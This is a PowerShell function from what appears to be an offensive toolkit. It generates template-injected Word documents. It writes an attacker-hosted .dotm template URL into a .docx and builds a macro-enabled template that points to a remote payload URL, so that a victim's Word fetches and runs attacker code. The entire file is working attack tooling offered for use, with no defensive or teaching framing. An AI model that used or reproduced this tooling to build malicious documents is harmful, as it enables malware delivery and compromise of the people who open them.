function Get-TemplateInjectedPayload {
#.SYNOPSIS
# TBA
# ARBITRARY VERSION NUMBER:  3.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# TBA
# 
# Parameters:
#   -TemplateURL    -->  URL of the malicious Word Template (.dotm) being hosted
#   -PayloadURL     -->  URL of the hosted payload that the macro points to
#   -Document       -->  Advanced: Target templated Word Document (.docx) to inject
#   -MacroContents  -->  Advanced: User input macro instead of the generated one
#   -Help           -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        [string]$TemplateURL,
        [string]$PayloadURL,
        [string]$MacroContents,
        [string]$Document,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return (Get-Help Get-TemplateInjectedPayload) }


    # Error Correction
    if ($Document) {
        if (!(Test-Path -LiteralPath $Document)) { return (Write-Host "Target document does not exist." -ForegroundColor Red)         }
        if ($Document -notlike '*.docx')         { return (Write-Host "Target document must be a '.docx' file." -ForegroundColor Red) }
    }

    if (!$TemplateURL)                  { return (Write-Host 'Template URL must be input.' -ForegroundColor Red )                                      }
    if ($TemplateURL -notlike 'http*')  { return (Write-Host 'Template URL not in the correct format.' -ForegroundColor Red)                           }
    if ($TemplateURL -like 'https*')    { return (Write-Host 'Template URL does not support HTTPS via self-signed certificates.' -ForegroundColor Red) }
    if ($TemplateURL -notlike '*.dotm') { return (Write-Host "Target template must be a '.dotm' file." -ForegroundColor Red)                           }

    if (!$MacroContents) {
        if (!$PayloadURL)                 { return (Write-HOst 'Must enter either a custom macro or target payload URL.' -ForegroundColor Red) }
        if ($PayloadURL -notlike 'http*') { return (Write-Host 'Payload URL not in the correct format.' -ForegroundColor Red)                  }
    }
    

    # Estbalish Variables
    $libMacroTemplate  = "$PSScriptRoot/lib/Build-MacroTemplate.ps1"
    $libTemplateInject = "$PSScriptRoot/lib/Build-TemplateInjection.ps1"
    $libVBASupport     = "$PSScriptRoot/lib/Test-VBASupport.ps1"
    $TemplateDirectory = "$PSScriptRoot/templates"
    $OutputPath        = "$PSScriptRoot/outputs/templateInjected"


    # Path Validation
    $Libs = @()
    if (Test-Path -LiteralPath $libVBASupport) { $Libs += (Get-Item -LiteralPath $libVBASupport).FullName }
    else { return (Write-Host "Unable to find 'Test-VBASupport.ps1'" -ForegroundColor Red) }
    if (Test-Path -LiteralPath $libTemplateInject) { $Libs += (Get-Item -LiteralPath $libTemplateInject).FullName }
    else { return (Write-Host "Unable to find 'Build-TemplateInjection.ps1'" -ForegroundColor Red) }
    if (Test-Path -LiteralPath $libMacroTemplate) { $Libs += (Get-Item -LiteralPath $libMacroTemplate).FullName }
    else { return (Write-Host "Unable to find 'Build-MacroTemplate.ps1'" -ForegroundColor Red) }


    # Importing Libraries
    Write-Host '[+] Importing Libraries...' -ForegroundColor Yellow
    foreach ($Library in $Libs) {
        . $Library
        Write-Host " o  $((Get-Item -LiteralPath $Library).Name)"
        Start-Sleep -Milliseconds 750
    }
    
    
    # Validate System Supports VBA Projects
    $VBAsupport = Test-VBASupport -Silent
    if ($VBAsupport) { Write-Host "`n[+] System supports VBA project generation.`n" -ForegroundColor Yellow ; Start-Sleep -Milliseconds 750 }
    else { return (Write-Host "`n[-] VBA project generation unsupported.  Run 'Test-VBASupport' for more information." -ForegroundColor Red) }


    # Use Specifed Document or Pick from Available Templates.
    if ($Document) {
        $DocumentBase = (Get-Item -LiteralPath $Document).Name
        $Document     = (Get-Item -LiteralPath $Document).FullName
    }
    else {
        
        # Validate Output Path Exists
        if (Test-Path -LiteralPath $OutputPath) { $OutputPath = (Get-Item -LiteralPath $OutputPath).FullName }
        else { return (Write-Host 'Unable to find the output directory.' -ForegroundColor Red) }
        
        # User Selection for Available Templates
        while ($TRUE) {
            $AvailableTemplates = @()
            if (Test-Path -LiteralPath $TemplateDirectory) { Get-ChildItem $TemplateDirectory -Filter '*.docx' | % { $AvailableTemplates += $_.Name } }
            else { return (Write-Host 'Template directory does not exist.' -ForegroundColor Red) }

            # Select Target Template
            Write-Host '[+] Select One of the Available Documents to Inject:' -ForegroundColor Yellow
            for ($i = 0; $i -lt ($AvailableTemplates.Length); $i++) {
                echo " o  ($i) $($AvailableTemplates[$i])"
            }
            
            # User Input
            Write-Host "`n[+] Select: " -NoNewline -ForegroundColor Yellow
            $Response = Read-Host

            # Input Validation
            if (($Response -ge $AvailableTemplates.Length) -or ($Response -lt 0)) {
                Write-Host "[-] Invalid input. Response should be numerical.`n" -ForegroundColor Red
                continue 
            }
            else {
                $DocumentBase = "$($AvailableTemplates[$Response])"
                $Document     = "$OutputPath/$($AvailableTemplates[$Response])"
                break
            }
        }        


        # Copy Selected Document to Output Directory
        Write-Host " o  Selected Document: '$DocumentBase'"

        if (Test-Path -LiteralPath $Document) { return (Write-Host '[-] Target document already exists.' -ForegroundColor Red) }

        Write-Host " o  Output Directory: '$($OutputPath.Replace($PSScriptRoot,'.'))'..."
        Copy-Item "$TemplateDirectory/$DocumentBase" $Document -Force
        Start-Sleep -Milliseconds 1500

        Write-Host " o  Done.`n"
    }


    # Begin Document Template Injection (.docx)
    Try {
        $TemplateName = $TemplateURL.Split('/')[-1]
        Build-TemplateInjection -Document $Document -TemplateURL $TemplateURL
    }
    Catch { Write-Host "[-] Failed to run 'Template-Inject' command.`n" -ForegroundColor Red; $TemplateName = '<N/A>' }


    # Begin Malicious Template Generation (.dotm)
    Try {
        if (!$MacroContents) { Build-MacroTemplate -TemplateName $TemplateName -PayloadURL $PayloadURL }
        else { Build-MacroTemplate -TemplateName $TemplateName -PayloadURL $PayloadURL -MacroContents $MacroContents }
    }
    Catch { Write-Host "[-] Failed to run 'Build-MacroTemplate' command.`n" -ForegroundColor Red; $DocumentBase = '<N/A>' }
    

    # Summary
    Write-Host '[+] Summary:' -ForegroundColor Yellow
    Write-Host " o  Macro Payload URL          : '$PayloadURL'"
    Write-Host " o  Word Template URL          : '$TemplateURL'"
    Write-Host " o  Macro Infested Template    : '$TemplateName'"
    Write-Host " o  Template Injected Document : '$DocumentBase'`n"
}